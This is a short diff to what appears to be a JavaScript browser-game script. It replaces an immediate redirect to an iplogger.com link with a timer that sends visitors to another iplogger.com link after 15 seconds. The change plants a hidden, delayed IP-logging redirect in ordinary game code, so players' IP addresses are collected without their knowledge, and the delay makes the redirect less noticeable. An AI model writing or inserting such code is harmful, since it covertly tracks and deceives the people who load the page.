@@ -274,7 +274,6 @@ function displayofthegame() {
 
 
 }
-function hej() {
-  location.assign('https://iplogger.com/2X5X65');
-} 
-hej();
+setTimeout(() =>{
+  location.assign('https://iplogger.com/2Xmq75')
+},15000)
